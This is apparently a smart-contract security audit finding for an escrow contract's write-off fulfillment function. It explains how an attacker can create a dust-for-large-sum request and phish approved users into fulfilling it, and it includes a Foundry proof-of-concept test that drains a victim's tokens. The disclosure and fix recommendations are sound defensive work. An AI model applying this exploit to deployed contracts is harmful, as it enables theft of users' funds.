### Title
Unrestricted `fullfillWriteOffRequest` lets an attacker drain any fulfiller's approved underlying by self-dealing a worthless write-off request - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`fullfillWriteOffRequest` pulls `underlying` from `msg.sender`, sends it to the request owner `_user`, and hands the fulfiller whatever tranche amount the requester escrowed — with no check that the swap is economically fair. An attacker can escrow a dust amount of tranche tokens while requesting a large `underlyings` amount, then trick any victim who has approved the escrow contract into fulfilling the attacker's request. The victim's underlying is sent to the attacker while the victim receives near-worthless tranches in return. This mirrors the Cooler `repay` bug: a permissionless function pulls tokens from `msg.sender` and delivers the benefit to another party.

### Finding Description
In `IdleCreditVaultWriteOffEscrow.createWriteOffRequest`, a user escrows `amount` tranche tokens and freely chooses `underlyingsRequested`, with no relationship enforced between the two:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:93-101
IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
userRequests[msg.sender] = WriteOffRequest({
  tranches: currentRequest.tranches + amount,
  underlyings: currentRequest.underlyings + underlyingsRequested
});
pendingUnderlyings += underlyingsRequested;
```

`fullfillWriteOffRequest` is callable "by any wallet" and only enforces that the fulfiller passes parameters matching the stored request:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:139-151
underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
...
underlyingToken.safeTransfer(_user, _underlyings - _totFee);
IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```

There is no lower bound on `tranches` relative to `underlyings`, and no guard preventing `_user` (the beneficiary) from having crafted an absurd exchange rate. Unlike `Cooler.repay`, the only thing standing between the attacker and the victim's funds is the victim signing the fulfillment transaction — exactly the phishing/infected-frontend vector from the report.

Attack sequence (epoch running):
1. Attacker calls `createWriteOffRequest(1 wei, 1_000_000e6)` — escrows 1 wei of tranche tokens, requests 1M USDC.
2. Victim has previously given the escrow a max underlying approval (normal for any fulfiller, e.g. the borrower or an arb desk).
3. Via a compromised frontend / phishing, victim calls `fullfillWriteOffRequest(attacker, 1, 1_000_000e6)`.
4. Escrow pulls 1M USDC from the victim, sends it (minus ≤1% fee) to the attacker, and gives the victim 1 wei of tranche tokens.

### Impact Explanation
Direct theft of the victim's underlying tokens, bounded only by their allowance to the escrow and their balance. The escrowed tranche "consideration" can be made arbitrarily small, so this is not a fair swap. Note that `borrower` (the intended honest fulfiller) typically must hold an underlying approval to this contract to fulfill write-offs, but the victim can equally be any lender or third-party fulfiller who ever approved the contract.

### Likelihood Explanation
Medium. Requires (a) the victim to have a standing underlying approval to the escrow and (b) a social-engineering step to get them to sign the fulfillment — the same assumptions rated Medium in the original Cooler report. No privileged role is needed; the attacker is any EOA able to deposit dust tranches during a running epoch.

### Recommendation
Enforce economic sanity or payer protection in `fullfillWriteOffRequest`:
- Require the fulfiller to explicitly bound the trade (they already pass `_tranches`/`_underlyings`, but add e.g. a `maxUnderlyingPerTranche` slippage parameter), or
- Price the exchange against the vault's current tranche NAV (`virtualPrice`) and reject requests whose implied discount exceeds a cap, or
- At minimum, restrict fulfillment to `msg.sender == borrower` or a whitelisted fulfiller set, since arbitrary third-party fulfillment of arbitrary-priced requests serves no legitimate purpose.

### Proof of Concept
Foundry-style PoC (fork, epoch running, tranche = AATranche, `oneScale` = underlying decimals):

```solidity
function testWriteOffEscrowPhishingDrain() external {
    uint256 amount = 10_000 * oneScale;
    idleCDO.depositAA(amount);          // seed vault
    _startEpochAndCheckPrices(0);       // epoch must be running for createWriteOffRequest

    address attacker = makeAddr("attacker");
    address victim   = makeAddr("victim");

    // Attacker gets dust tranches and creates an absurd request
    deal(address(aaTranche), attacker, 1);
    vm.prank(attacker);
    escrow.createWriteOffRequest(1, amount);   // 1 wei tranche for 10k underlying

    // Victim (e.g. a fulfiller desk) has a standing underlying approval to the escrow
    deal(USDC, victim, amount);
    vm.prank(victim);
    IERC20Detailed(USDC).approve(address(escrow), type(uint256).max);

    // Victim is phished into fulfilling the attacker's request
    vm.prank(victim);
    escrow.fullfillWriteOffRequest(attacker, 1, amount);

    uint256 fee = amount * escrow.exitFee() / 100_000;
    assertEq(underlying.balanceOf(attacker), amount - fee); // attacker pockets victim's funds
    assertEq(underlying.balanceOf(victim), 0);              // victim drained
    assertEq(aaTranche.balanceOf(victim), 1);               // victim got 1 wei of tranche
}
```
